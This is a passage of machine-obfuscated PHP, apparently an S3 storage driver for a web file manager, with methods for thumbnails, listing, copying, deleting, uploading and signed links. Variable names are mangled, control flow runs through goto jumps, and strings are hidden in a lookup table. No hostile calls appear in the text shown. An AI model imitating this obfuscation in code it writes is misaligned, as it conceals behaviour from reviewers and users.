IO::mkdir(IO_PATH_SYSTEM_TEMP . $a‡âî˜ù”ô[178]); } else { $eáÌùÂ„¡Ô = KodIO::make($d¹ö‚ò®); } if ($d¹ö‚ò® = IO::fileNameExist($eáÌùÂ„¡Ô, $FĞ›ƒŸ“Ä„)) { $eˆ¸ÃéÇö = KodIO::make($d¹ö‚ò®); return IO::fileOut($eˆ¸ÃéÇö); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto bË…Öéõª; D‰˜íèš: if (!($DëÂ»ãœğ = IO::move($eˆ¸ÃéÇö, $eáÌùÂ„¡Ô))) { return IO::fileOut($eˆ¸ÃéÇö); } del_file($eˆ¸ÃéÇö); IO::fileOut($DëÂ»ãœğ); goto e˜ïåÚñ±Ğ; bË…Öéõª: $eˆ¸ÃéÇö = DATA_THUMB . $FĞ›ƒŸ“Ä„; if (!@file_exists($eˆ¸ÃéÇö)) { $F§£†ÇµÉ = TEMP_FILES; if (!is_dir($F§£†ÇµÉ)) { mk_dir($F§£†ÇµÉ); } $CµÏÕ¦•£ = $F§£†ÇµÉ . $DŸÒ¯°æĞÔ . $a‡âî˜ù”ô[103] . $F›ˆ¬Û‘ÖÅ[$a‡âî˜ù”ô[172]]; if (!@file_exists($CµÏÕ¦•£)) { $CµÏÕ¦•£ = $this->download($EÎÎ¬–¥°, $CµÏÕ¦•£); } $BÔÛÇÆˆÀ¨ = new ImageThumb($CµÏÕ¦•£, $a‡âî˜ù”ô[179]); $BÔÛÇÆˆÀ¨->prorate($eˆ¸ÃéÇö, $AËÚÆôéË¤, $AËÚÆôéË¤ * 10); } if (!file_exists($eˆ¸ÃéÇö) || filesize($eˆ¸ÃéÇö) < 100) { return @file_exists($CµÏÕ¦•£) ? IO::fileOut($CµÏÕ¦•£) : $this->fileOut($EÎÎ¬–¥°); } goto D‰˜íèš; b— º˜í£²: $a‡âî˜ù”ô =& $_SERVER[¹÷ˆ§éÒ°ú]; if (substr($EÎÎ¬–¥°, 0, 4) == $a‡âî˜ù”ô[156]) { $this->fileOutLink($EÎÎ¬–¥°); } $F›ˆ¬Û‘ÖÅ = $this->info($EÎÎ¬–¥°); goto d°Ù¸®¾îÛ; d°Ù¸®¾îÛ: if ($F›ˆ¬Û‘ÖÅ[$a‡âî˜ù”ô[89]] <= 1024 * 50 || !function_exists($a‡âî˜ù”ô[171]) || $F›ˆ¬Û‘ÖÅ[$a‡âî˜ù”ô[172]] == $a‡âî˜ù”ô[173]) { return $this->fileOut($EÎÎ¬–¥°); } if (isset($F›ˆ¬Û‘ÖÅ[$a‡âî˜ù”ô[174]][$a‡âî˜ù”ô[175]])) { $DŸÒ¯°æĞÔ = $F›ˆ¬Û‘ÖÅ[$a‡âî˜ù”ô[174]][$a‡âî˜ù”ô[175]]; } else { if (isset($F›ˆ¬Û‘ÖÅ[$a‡âî˜ù”ô[174]][$a‡âî˜ù”ô[176]])) { $DŸÒ¯°æĞÔ = $F›ˆ¬Û‘ÖÅ[$a‡âî˜ù”ô[174]][$a‡âî˜ù”ô[176]]; } else { $DŸÒ¯°æĞÔ = md5("{$F›ˆ¬Û‘ÖÅ[$a‡âî˜ù”ô[38]]}\x5f{$F›ˆ¬Û‘ÖÅ[$a‡âî˜ù”ô[87]]}\x5f{$F›ˆ¬Û‘ÖÅ[$a‡âî˜ù”ô[89]]}"); } } $FĞ›ƒŸ“Ä„ = "{$DŸÒ¯°æĞÔ}\137{$AËÚÆôéË¤}\56\160\x6e\147"; goto Bæ—ïĞ½Œ¸; e˜ïåÚñ±Ğ: } public function fileOutImageServer($DÂ÷ÒÙºùÉ, $Aß›¡¥ØÆ = 250) { $this->fileOutImage($DÂ÷ÒÙºùÉ, $Aß›¡¥ØÆ); } public function fileNameAuto($C†‡Šñ¿èá, $E¸ğò’‚½“, $bõŒÇñìğ¿ = REPEAT_RENAME, $c”Š¤Çë³÷ = false) { goto CÁÆ³ˆÅªÖ; FåŞè‚´ˆø: if ($bõŒÇñìğ¿ == REPEAT_SKIP) { return !1; } $b¹ÁˆİÁïÀ = $EÄ†å¬Ãô©[103] . get_path_ext($E¸ğò’‚½“); $b¹ÁˆİÁïÀ = $b¹ÁˆİÁïÀ == $EÄ†å¬Ãô©[103] || $c”Š¤Çë³÷ ? $EÄ†å¬Ãô©[43] : $b¹ÁˆİÁïÀ; goto EìÇ³´Ó¬; CÁÆ³ˆÅªÖ: $EÄ†å¬Ãô© =& $_SERVER[¹÷ˆ§éÒ°ú]; $E«„›ÕñØœ = $C†‡Šñ¿èá === $EÄ†å¬Ãô©[43] ? $E¸ğò’‚½“ : rtrim($C†‡Šñ¿èá, $EÄ†å¬Ãô©[18]) . $EÄ†å¬Ãô©[18] . $E¸ğò’‚½“; if ($bõŒÇñìğ¿ == REPEAT_REPLACE || !$this->exist($E«„›ÕñØœ) || $c”Š¤Çë³÷ && $bõŒÇñìğ¿ != REPEAT_RENAME_FOLDER) { return $E¸ğò’‚½“; } goto FåŞè‚´ˆø; c×ŞïÀôù˜: while ($this->exist(rtrim($C†‡Šñ¿èá, $EÄ†å¬Ãô©[18]) . $EÄ†å¬Ãô©[18] . $fµ™˜¬ˆ‰)) { $fµ™˜¬ˆ‰ = $AÀÌ‰á‰•ó . "\x28{$Eßó£é•…å}\51{$b¹ÁˆİÁïÀ}"; $Eßó£é•…å++; } return $fµ™˜¬ˆ‰; goto bÚàãëÕĞ; EìÇ³´Ó¬: $Eßó£é•…å = 1; $AÀÌ‰á‰•ó = substr($E¸ğò’‚½“, 0, strlen($E¸ğò’‚½“) - strlen($b¹ÁˆİÁïÀ)); $fµ™˜¬ˆ‰ = $AÀÌ‰á‰•ó . "\x28{$Eßó£é•…å}\x29{$b¹ÁˆİÁïÀ}"; goto c×ŞïÀôù˜; bÚàãëÕĞ: } public function listAllFiles($b›ØÔ¢©¾, $a·•Â¢›Ä¯, $D‡«À”»ª™ = array()) { goto eÂİÒÖšêì; E˜ö”Š¥åÍ: $b›ØÔ¢©¾ = trim($b›ØÔ¢©¾, $BõİöĞ¬à[18]); foreach ($a·•Â¢›Ä¯ as $b¼ïÁØ÷‡î) { $dğ¹ŒëÇŠ = ltrim(substr($b¼ïÁØ÷‡î, strlen($b›ØÔ¢©¾)), $BõİöĞ¬à[18]); $Dø¡–“³×‹ = array_merge($Dø¡–“³×‹, $this->slicePath($dğ¹ŒëÇŠ)); } $e©‘Â¸Ö…Ê = array(); goto E†›ãŸõÁÓ; eÂİÒÖšêì: $BõİöĞ¬à =& $_SERVER[¹÷ˆ§éÒ°ú]; if (empty($a·•Â¢›Ä¯)) { return array(); } $Dø¡–“³×‹ = array(); goto E˜ö”Š¥åÍ; E†›ãŸõÁÓ: foreach (array_unique($Dø¡–“³×‹) as $b¼ïÁØ÷‡î) { $fÊ¸Ößö˜ = array($BõİöĞ¬à[87] => $this->getPathOuter($BõİöĞ¬à[18] . $b›ØÔ¢©¾ . $BõİöĞ¬à[18] . $b¼ïÁØ÷‡î), $BõİöĞ¬à[88] => 1, $BõİöĞ¬à[89] => 0); if (substr($b¼ïÁØ÷‡î, -1) != $BõİöĞ¬à[18]) { $fÊ¸Ößö˜[$BõİöĞ¬à[88]] = 0; $CÔ‡Ú ğŸ¸ = $this->getPath($b›ØÔ¢©¾ . $BõİöĞ¬à[18] . $b¼ïÁØ÷‡î); $fÊ¸Ößö˜[$BõİöĞ¬à[89]] = isset($D‡«À”»ª™[$CÔ‡Ú ğŸ¸]) ? $D‡«À”»ª™[$CÔ‡Ú ğŸ¸] : $this->size($CÔ‡Ú ğŸ¸); } $e©‘Â¸Ö…Ê[] = $fÊ¸Ößö˜; } return $e©‘Â¸Ö…Ê; goto A´öĞáì–¦; A´öĞáì–¦: } public function slicePath($D±ĞêÃÅÑ») { $d÷˜³µÅé =& $_SERVER[¹÷ˆ§éÒ°ú]; $fˆˆ‚¼çìË = explode($d÷˜³µÅé[18], trim($D±ĞêÃÅÑ», $d÷˜³µÅé[18])); $cŞ‹ê„‹‘ò = 0; do { ++$cŞ‹ê„‹‘ò; $dèÖÖìÛÔ§[] = implode($d÷˜³µÅé[18], array_slice($fˆˆ‚¼çìË, 0, $cŞ‹ê„‹‘ò)) . $d÷˜³µÅé[18]; } while ($cŞ‹ê„‹‘ò < count($fˆˆ‚¼çìË)); $dèÖÖìÛÔ§[count($fˆˆ‚¼çìË) - 1] = $D±ĞêÃÅÑ»; return $dèÖÖìÛÔ§; } public function getHost() { $Eç¦”²÷ =& $_SERVER[¹÷ˆ§éÒ°ú]; $d„µñÒôñø = parse_url(trim($this->domain, $Eç¦”²÷[18])); $bôÜƒ½‰¤ë = isset($d„µñÒôñø[$Eç¦”²÷[180]]) ? $d„µñÒôñø[$Eç¦”²÷[180]] : http_type(); $bª Ûö½˜• = isset($d„µñÒôñø[$Eç¦”²÷[181]]) ? $d„µñÒôñø[$Eç¦”²÷[181]] : $d„µñÒôñø[$Eç¦”²÷[87]]; if (isset($d„µñÒôñø[$Eç¦”²÷[182]])) { $bª Ûö½˜• .= $Eç¦”²÷[14] . $d„µñÒôñø[$Eç¦”²÷[182]]; } return $bôÜƒ½‰¤ë . $Eç¦”²÷[183] . $bª Ûö½˜•; } public function pathEncode($f‡œ‡ŞóÈ) { $e°â’¸ÑÙ¢ =& $_SERVER[¹÷ˆ§éÒ°ú]; return str_replace($e°â’¸ÑÙ¢[184], $e°â’¸ÑÙ¢[18], rawurlencode($f‡œ‡ŞóÈ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($aâì£Ä¿Ó¡) { set_timeout(); require_once SDK_DIR . $_SERVER[¹÷ˆ§éÒ°ú][185]; parent::__construct(); $this->_init($aâì£Ä¿Ó¡); } public function _init($B½çñÓˆÇË) { foreach ($B½çñÓˆÇË as $d–ïÚšŞ¦˜ => $f–ÓÅ¡Àñ³) { if (isset($this->{$d–ïÚšŞ¦˜})) { $this->{$d–ïÚšŞ¦˜} = $f–ÓÅ¡Àñ³; } } $this->endpoint = $B½çñÓˆÇË[$_SERVER[¹÷ˆ§éÒ°ú][186]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($B¿ôİÁÅˆê = "\166\64") { $this->signVer = $B¿ôİÁÅˆê; $this->client->setSignatureVersion($B¿ôİÁÅˆê); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto DÎŸóŒ®ƒ; b½±™­ºø·: if ($a”¡™¶àí[$A“ÆÌÌá‹[187]] != $A“ÆÌÌá‹[188] || $a”¡™¶àí[$A“ÆÌÌá‹[189]] != $A“ÆÌÌá‹[188]) { return !1; } $AÙ¶ ®ö´ = array_map($A“ÆÌÌá‹[190], $a”¡™¶àí[$A“ÆÌÌá‹[191]]); if (!is_array($AÙ¶ ®ö´)) { $AÙ¶ ®ö´ = array(); } goto e‹Ã“İæ÷À; DÎŸóŒ®ƒ: $A“ÆÌÌá‹ =& $_SERVER[¹÷ˆ§éÒ°ú]; $a”¡™¶àí = $this->getBucketCors(); if (!$a”¡™¶àí || !is_array($a”¡™¶àí)) { return !1; } goto b½±™­ºø·; e‹Ã“İæ÷À: $E”¸Ÿ¥ºëŸ = array($A“ÆÌÌá‹[192], $A“ÆÌÌá‹[193], $A“ÆÌÌá‹[194], $A“ÆÌÌá‹[195], $A“ÆÌÌá‹[196]); $Bº­é›”Á = array_diff($E”¸Ÿ¥ºëŸ, $AÙ¶ ®ö´); return empty($Bº­é›”Á); goto DÀõƒÕâÉó; DÀõƒÕâÉó: } public function mkfile($DóÓÉÊ¯, $føÌ•íƒŸ» = '', $dä¹ëñÇ» = REPEAT_RENAME) { $c ±‹ò Õ = $this->setContent($DóÓÉÊ¯, $føÌ•íƒŸ»); if ($c ±‹ò Õ !== !1) { return $this->getPathOuter($DóÓÉÊ¯); } return !1; } public function mkdir($c³Ä¥»ùˆ, $aÇÉ¾àŞ„ = REPEAT_SKIP) { if (empty($c³Ä¥»ùˆ)) { return !1; } if ($this->_isFolder($c³Ä¥»ùˆ)) { return $this->getPathOuter($c³Ä¥»ùˆ); } $EÄíùƒåƒÀ = $this->setContent($c³Ä¥»ùˆ, $_SERVER[¹÷ˆ§éÒ°ú][43], !0); if ($EÄíùƒåƒÀ !== !1) { return $this->getPathOuter($c³Ä¥»ùˆ); } return !1; } public function copyFile($dˆÓè°´£, $e¹îŸØçåª, $D¤Àìæäâ = array()) { $Fš’Ëæ­… =& $_SERVER[¹÷ˆ§éÒ°ú]; $AÔ›´¨ò®º = $this->objectMeta($dˆÓè°´£); if (!$AÔ›´¨ò®º) { return !1; } if ($AÔ›´¨ò®º[$Fš’Ëæ­…[89]] <= 1024 * 1024 * 200) { $d¦Æ¤ò« = $this->client->copyObject($this->bucket, $dˆÓè°´£, $this->bucket, $e¹îŸØçåª, $Fš’Ëæ­…[197], $D¤Àìæäâ); } else { $d¦Æ¤ò« = $this->client->multiCopyObject($this->bucket, $dˆÓè°´£, $this->bucket, $e¹îŸØçåª, $D¤Àìæäâ); } $d¦Æ¤ò« = $d¦Æ¤ò« ? $this->getPathOuter($e¹îŸØçåª) : !1; return $d¦Æ¤ò«; } public function moveFile($B”¹Ø¥ÎæÌ, $Fø„ê¨‡ëÛ) { if ($this->copyFile($B”¹Ø¥ÎæÌ, $Fø„ê¨‡ëÛ)) { $this->delFile($B”¹Ø¥ÎæÌ); return $this->getPathOuter($Fø„ê¨‡ëÛ); } return !1; } public function delFile($AìÎ…Àèâ) { return $this->client->deleteObject($this->bucket, $AìÎ…Àèâ); } public function delFolder($d»¦éÎî·Ğ) { goto aç‰‹«ÛÌÑ; eÀ’¶ïã: return $E¶Š¼ñ–§É === $BÜÖØ´×Â… ? !0 : !1; goto F‡Ì¦°×ã; cÎÅïÃ§è: $E¶Š¼ñ–§É = $BÜÖØ´×Â… = 0; $Bî—¢Âà½ = array_chunk(array_keys($e¸¥ÓÜäóœ), 1000); foreach ($Bî—¢Âà½ as $A•ÔµÜ¦Å¥) { $E¶Š¼ñ–§É++; $BÜÖØ´×Â… += (int) $this->client->deleteObjects($this->bucket, $A•ÔµÜ¦Å¥); } goto eÀ’¶ïã; aç‰‹«ÛÌÑ: $fµˆ®„Œ«„ =& $_SERVER[¹÷ˆ§éÒ°ú]; $e¸¥ÓÜäóœ = $this->listObjs($d»¦éÎî·Ğ); if (!$e¸¥ÓÜäóœ) { $d»¦éÎî·Ğ = trim($d»¦éÎî·Ğ, $fµˆ®„Œ«„[18]); if (!empty($d»¦éÎî·Ğ)) { $d»¦éÎî·Ğ .= $fµˆ®„Œ«„[18]; } return $this->delFile($d»¦éÎî·Ğ); } goto cÎÅïÃ§è; F‡Ì¦°×ã: } public function rename($eòÄ…ÎÍÀ©, $E¢¬³ÅÒ‘£) { return $this->renameObject($eòÄ…ÎÍÀ©, $E¢¬³ÅÒ‘£); } public function listPath($dŸì°Ÿ¹, $d•Ò³‡Íª = false) { $aˆ®÷Û¢µã =& $_SERVER[¹÷ˆ§éÒ°ú]; $D©©£Ğ Â‘ = $this->listObjs($dŸì°Ÿ¹, null, null, $aˆ®÷Û¢µã[18]); $A± ¹Ğ¥¥ = array($aˆ®÷Û¢µã[86] => array(), $aˆ®÷Û¢µã[85] => array()); foreach ($D©©£Ğ Â‘ as $EêÆä´÷‰Ë => $Fï“Œ¶‡÷°) { if ($EêÆä´÷‰Ë == $aˆ®÷Û¢µã[18]) { continue; } if (isset($Fï“Œ¶‡÷°[$aˆ®÷Û¢µã[198]])) { $A± ¹Ğ¥¥[$aˆ®÷Û¢µã[86]][] = $this->folderInfo($Fï“Œ¶‡÷°[$aˆ®÷Û¢µã[198]], $d•Ò³‡Íª); } else { if (substr($Fï“Œ¶‡÷°[$aˆ®÷Û¢µã[38]], -1) == $aˆ®÷Û¢µã[18]) { continue; } $A± ¹Ğ¥¥[$aˆ®÷Û¢µã[85]][] = $this->fileInfo($Fï“Œ¶‡÷°[$aˆ®÷Û¢µã[38]], $d•Ò³‡Íª, $Fï“Œ¶‡÷°); } } return $A± ¹Ğ¥¥; } private function fileInfo($aÓ›Ãˆ®ï’, $EòŞòÁ•Îô = false, $F¾‘ã¾ÏÄŒ = array()) { goto B¬Ë–ˆöÎ¹; D‚æËŞî“µ: return $c±‰ŸÙä´; goto fğœ­õäªè; B¬Ë–ˆöÎ¹: $c­á»™¢á§ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($EòŞòÁ•Îô) { return array($c­á»™¢á§[38] => $this->pathThis($aÓ›Ãˆ®ï’), $c­á»™¢á§[87] => $this->getPathOuter($aÓ›Ãˆ®ï’), $c­á»™¢á§[39] => $c­á»™¢á§[179], $c­á»™¢á§[172] => $this->ext($aÓ›Ãˆ®ï’), $c­á»™¢á§[89] => isset($F¾‘ã¾ÏÄŒ[$c­á»™¢á§[89]]) ? $F¾‘ã¾ÏÄŒ[$c­á»™¢á§[89]] : 0, $c­á»™¢á§[199] => 0, $c­á»™¢á§[119] => 0, $c­á»™¢á§[200] => !0, $c­á»™¢á§[201] => !0); } $c±‰ŸÙä´ = array($c­á»™¢á§[38] => $this->pathThis($aÓ›Ãˆ®ï’), $c­á»™¢á§[87] => $this->getPathOuter($aÓ›Ãˆ®ï’), $c­á»™¢á§[39] => $c­á»™¢á§[179], $c­á»™¢á§[199] => 0, $c­á»™¢á§[119] => 0, $c­á»™¢á§[89] => 0, $c­á»™¢á§[172] => $this->ext($aÓ›Ãˆ®ï’), $c­á»™¢á§[200] => !0, $c­á»™¢á§[201] => !0); goto C®ÆÜ¶¸š; C®ÆÜ¶¸š: if (empty($F¾‘ã¾ÏÄŒ)) { $F¾‘ã¾ÏÄŒ = $this->objectMeta($aÓ›Ãˆ®ï’); if (!$F¾‘ã¾ÏÄŒ) { return $c±‰ŸÙä´; } } if (isset($F¾‘ã¾ÏÄŒ[$c­á»™¢á§[202]])) { $c±‰ŸÙä´[$c­á»™¢á§[119]] = $F¾‘ã¾ÏÄŒ[$c­á»™¢á§[202]]; } if (isset($F¾‘ã¾ÏÄŒ[$c­á»™¢á§[89]])) { $c±‰ŸÙä´[$c­á»™¢á§[89]] = $F¾‘ã¾ÏÄŒ[$c­á»™¢á§[89]]; } goto D‚æËŞî“µ; fğœ­õäªè: } private function folderInfo($dÈ»Ş©°•, $Bõ–‡ç‰İ¼ = false) { goto e‘ì§ãˆ; BÆö§ÜÌ¤Á: if ($dÈ»Ş©°• == $b§‘Ê¬–’[43]) { return $f«ìÜÔ¥§Ä; } $dÈ»Ş©°• = trim($dÈ»Ş©°•, $b§‘Ê¬–’[18]) . $b§‘Ê¬–’[18]; $d†«´ŒÔø¶ = $this->objectMeta($dÈ»Ş©°•); goto DŠïŒÛê¿Ó; DŠïŒÛê¿Ó: if (isset($d†«´ŒÔø¶[$b§‘Ê¬–’[202]])) { $f«ìÜÔ¥§Ä[$b§‘Ê¬–’[199]] = $d†«´ŒÔø¶[$b§‘Ê¬–’[202]]; } return $f«ìÜÔ¥§Ä; goto AÕ‚õƒİ†; e‘ì§ãˆ: $b§‘Ê¬–’ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($Bõ–‡ç‰İ¼) { return array($b§‘Ê¬–’[38] => $this->pathThis($dÈ»Ş©°•), $b§‘Ê¬–’[87] => $this->getPathOuter($b§‘Ê¬–’[18] . $dÈ»Ş©°•), $b§‘Ê¬–’[39] => $b§‘Ê¬–’[88], $b§‘Ê¬–’[200] => !0, $b§‘Ê¬–’[201] => !0); } $f«ìÜÔ¥§Ä = array($b§‘Ê¬–’[38] => $this->pathThis($dÈ»Ş©°•), $b§‘Ê¬–’[87] => $this->getPathOuter($b§‘Ê¬–’[18] . $dÈ»Ş©°•), $b§‘Ê¬–’[39] => $b§‘Ê¬–’[88], $b§‘Ê¬–’[199] => 0, $b§‘Ê¬–’[119] => 0, $b§‘Ê¬–’[200] => !0, $b§‘Ê¬–’[201] => !0); goto BÆö§ÜÌ¤Á; AÕ‚õƒİ†: } public function listObjs($C¹Ï…Í‡»ˆ, $CÕ¨¦Âô¹ = null, $Eç‚ƒğ¨è = null, $f—‹ÀÈÑÓ = null) { $dÕÖø°ğáË =& $_SERVER[¹÷ˆ§éÒ°ú]; $C¹Ï…Í‡»ˆ = trim($C¹Ï…Í‡»ˆ, $dÕÖø°ğáË[18]); $b¨‘ïÕ”È¼ = empty($C¹Ï…Í‡»ˆ) ? $dÕÖø°ğáË[43] : $C¹Ï…Í‡»ˆ . $dÕÖø°ğáË[18]; return $this->client->getBucket($this->bucket, $b¨‘ïÕ”È¼, $CÕ¨¦Âô¹, $Eç‚ƒğ¨è, $f—‹ÀÈÑÓ, !0); } public function has($Fğ‡ÉëöÂÕ, $BË·ÎäÀÎî = false, $cá›‘•ŒÑ = true) { goto F‰’ØÑİòĞ; aÇ½Ã‚ÓÀ´: $CÄÌ·È‘ÂÛ = $this->listObjs($Fğ‡ÉëöÂÕ, null, null, $B©½Œà…¢Á[18]); $CÄÌ·È‘ÂÛ = is_array($CÄÌ·È‘ÂÛ) ? $CÄÌ·È‘ÂÛ : array(); foreach ($CÄÌ·È‘ÂÛ as $bô¸­©ËºÎ) { if (isset($bô¸­©ËºÎ[$B©½Œà…¢Á[38]]) && substr($bô¸­©ËºÎ[$B©½Œà…¢Á[38]], -1) != $B©½Œà…¢Á[18]) { if (!$BË·ÎäÀÎî && $cá›‘•ŒÑ) { return !0; } $bĞâ¤ÚÚˆÀ++; } else { if (isset($bô¸­©ËºÎ[$B©½Œà…¢Á[198]])) { if (!$BË·ÎäÀÎî && !$cá›‘•ŒÑ) { return !1; } $f¬Ú™¿…»‘++; } } } goto e‘È¨“ÅçÓ; F‰’ØÑİòĞ: $B©½Œà…¢Á =& $_SERVER[¹÷ˆ§éÒ°ú]; $bĞâ¤ÚÚˆÀ = 0; $f¬Ú™¿…»‘ = 0; goto aÇ½Ã‚ÓÀ´; e‘È¨“ÅçÓ: if ($BË·ÎäÀÎî) { return array($B©½Œà…¢Á[203] => $bĞâ¤ÚÚˆÀ, $B©½Œà…¢Á[204] => $f¬Ú™¿…»‘); } return !1; goto C’ƒ¬½ãƒé; C’ƒ¬½ãƒé: } public function listAll($b¯Ã¨ˆ†œ) { $f¢¢µ¥·š =& $_SERVER[¹÷ˆ§éÒ°ú]; $aåÍ“æº = $this->listObjs($b¯Ã¨ˆ†œ); $aæ¸éÒˆ° = $Bä·®µšœ† = array(); foreach ($aåÍ“æº as $Aö´ãÈ‡ => $ašÌ©„ÇøÔ) { $aæ¸éÒˆ°[] = $ašÌ©„ÇøÔ[$f¢¢µ¥·š[38]]; $Bä·®µšœ†[$Aö´ãÈ‡] = $ašÌ©„ÇøÔ[$f¢¢µ¥·š[89]]; } return $this->listAllFiles($b¯Ã¨ˆ†œ, $aæ¸éÒˆ°, $Bä·®µšœ†); } public function canRead($aÈ±±¯ÛŞ) { $a˜ŸÃßµÍ„ =& $_SERVER[¹÷ˆ§éÒ°ú]; $DÛª³è„Ë = $this->client->getAccessControlPolicy($this->bucket, $aÈ±±¯ÛŞ); if (!$DÛª³è„Ë) { return !1; } return in_array($DÛª³è„Ë, array($a˜ŸÃßµÍ„[205], $a˜ŸÃßµÍ„[206], $a˜ŸÃßµÍ„[207])) ? !0 : !1; } public function canWrite($b¼‡òä½Š) { $Dô¼«äÃİ« =& $_SERVER[¹÷ˆ§éÒ°ú]; $a‰‡ËØ¾à  = $this->client->getAccessControlPolicy($this->bucket, $b¼‡òä½Š); if (!$a‰‡ËØ¾à ) { return !1; } return in_array($a‰‡ËØ¾à , array($Dô¼«äÃİ«[205], $Dô¼«äÃİ«[206])) ? !0 : !1; } public function getContent($fµÉ‡áÊ) { return $this->client->getObject($this->bucket, $fµÉ‡áÊ); } public function setContent($bÏéêƒ¯ŠŠ, $b©Ğ‡¬‚Õ = '', $aÁœÆ¼ÄÒÒ = false) { goto cÆ‡´»œõ¢; B¯°¥¾ŸÙŸ: $this->cacheMethod(null, null); $b··‹Å•¯Æ = $this->copyFile($bÏéêƒ¯ŠŠ, $bÏéêƒ¯ŠŠ, array($CÖø¼‚ßÕ[208] => $b··‹Å•¯Æ[$CÖø¼‚ßÕ[209]])); return $b··‹Å•¯Æ ? !0 : !1; goto Eãšğ·¹Õ”; cÆ‡´»œõ¢: $CÖø¼‚ßÕ =& $_SERVER[¹÷ˆ§éÒ°ú]; $bÏéêƒ¯ŠŠ = $aÁœÆ¼ÄÒÒ ? trim($bÏéêƒ¯ŠŠ, $CÖø¼‚ßÕ[18]) . $CÖø¼‚ßÕ[18] : $bÏéêƒ¯ŠŠ; $FéĞÓ¶‚÷İ = get_file_mime(get_path_ext($bÏéêƒ¯ŠŠ)); goto cİ†¥î”Ù; cİ†¥î”Ù: $b··‹Å•¯Æ = $this->client->putObject($b©Ğ‡¬‚Õ, $this->bucket, $bÏéêƒ¯ŠŠ, $CÖø¼‚ßÕ[197], array(), $FéĞÓ¶‚÷İ); if (!$b··‹Å•¯Æ) { return !1; } if ($aÁœÆ¼ÄÒÒ) { return !0; } goto B¯°¥¾ŸÙŸ; Eãšğ·¹Õ”: } public function fileSubstr($eÜ¡Ø¥æëÙ, $cœí¾É§õÓ, $båÏºîÉŒé) { $FÇöß¿ëœª = $cœí¾É§õÓ + $båÏºîÉŒé - 1; return $this->client->getObject($this->bucket, $eÜ¡Ø¥æëÙ, array($_SERVER[¹÷ˆ§éÒ°ú][210] => "\142\171\x74\x65\x73\75{$cœí¾É§õÓ}\55{$FÇöß¿ëœª}")); } public function upload($dÔŞè¤´Õ, $A™âÅÎö¸¬, $D·´Ï¶öÅ = false, $AÜ¤Ä Í’‚ = REPEAT_REPLACE) { $FÚŞâÒ‰Úƒ =& $_SERVER[¹÷ˆ§éÒ°ú]; $aÜîÓ³¼ = array($FÚŞâÒ‰Úƒ[208] => @md5_file($A™âÅÎö¸¬)); $fíºÁÍ»öŞ = array($FÚŞâÒ‰Úƒ[211] => get_file_mime(get_path_ext($dÔŞè¤´Õ))); if (IO::size($A™âÅÎö¸¬) <= 1024 * 1024 * 200) { $d‚µ…Œ¬ = $this->client->putObjectFile($A™âÅÎö¸¬, $this->bucket, $dÔŞè¤´Õ, $FÚŞâÒ‰Úƒ[197], $aÜîÓ³¼, $fíºÁÍ»öŞ); return !empty($d‚µ…Œ¬) ? $this->getPathOuter($dÔŞè¤´Õ) : !1; } $bãš‘¥ìñ¼ = $this->client->multiUploadObject($A™âÅÎö¸¬, $this->bucket, trim($dÔŞè¤´Õ, $FÚŞâÒ‰Úƒ[18]), $aÜîÓ³¼, $fíºÁÍ»öŞ); return $bãš‘¥ìñ¼ ? $this->getPathOuter($dÔŞè¤´Õ) : !1; } public function download($DØˆ­œó, $eÆË¡¡‰¦ñ) { if (!@is_dir($this->pathFather($eÆË¡¡‰¦ñ)) && !IO::mkdir($this->pathFather($eÆË¡¡‰¦ñ))) { return !1; } $bì‡†›¢”¶ = $this->client->getObject($this->bucket, $DØˆ­œó, array(), $eÆË¡¡‰¦ñ); return $bì‡†›¢”¶ !== !1 ? $eÆË¡¡‰¦ñ : !1; } public function link($dºÒ’†İŒ¦, $D‡ˆ“ÑÈˆê = array()) { $Eñ¬¥Üµ†ò =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($this->signVer == $Eñ¬¥Üµ†ò[212]) { return $this->client->getAuthenticatedURL($this->bucket, $dºÒ’†İŒ¦, 3600 * 12, $D‡ˆ“ÑÈˆê); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($dºÒ’†İŒ¦, $Eñ¬¥Üµ†ò[18]), 3600 * 12, $this->region, array(), !0, $D‡ˆ“ÑÈˆê); } public function fileOut($CÄÕœŠ…, $Fá‡°ìï®õ = false, $f†ñÅƒ¬ÀÑ = false, $CßµåÅâ¬‹ = '') { goto c’†îÛ¡Æì; c’†îÛ¡Æì: $C…È÷ÁÕµ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($this->isFileOutServer()) { return $this->fileOutServer($CÄÕœŠ…, $Fá‡°ìï®õ, $f†ñÅƒ¬ÀÑ, $CßµåÅâ¬‹); } if (!$f†ñÅƒ¬ÀÑ) { $f†ñÅƒ¬ÀÑ = $this->pathThis($CÄÕœŠ…); } goto AôÓ¨ÈÒÃ; d¢ë˜ššö: $Eí¼½è°¾ = array($C…È÷ÁÕµ[216] => $Fá‡°ìï®õ . $C…È÷ÁÕµ[217] . rawurlencode($f†ñÅƒ¬ÀÑ), $C…È÷ÁÕµ[218] => $FñºÃ„ãÙ); $b½‰ÕŞ° = $this->link($CÄÕœŠ…, $Eí¼½è°¾); $this->fileOutLink($b½‰ÕŞ°); goto a¾­·ø®­; AôÓ¨ÈÒÃ: $FñºÃ„ãÙ = get_file_mime(get_path_ext($f†ñÅƒ¬ÀÑ)); if ($FñºÃ„ãÙ == $C…È÷ÁÕµ[213]) { return parent::fileOut($CÄÕœŠ…, $Fá‡°ìï®õ, $f†ñÅƒ¬ÀÑ, $CßµåÅâ¬‹); } $Fá‡°ìï®õ = $Fá‡°ìï®õ ? $C…È÷ÁÕµ[214] : $C…È÷ÁÕµ[215]; goto d¢ë˜ššö; a¾­·ø®­: } public function fileOutServer($D´’Š”í‘, $e¬Úšã÷º = false, $B¼™ÜÕ°¹‘ = false, $Eéƒ‰™š¹‘ = '') { parent::fileOut($D´’Š”í‘, $e¬Úšã÷º, $B¼™ÜÕ°¹‘, 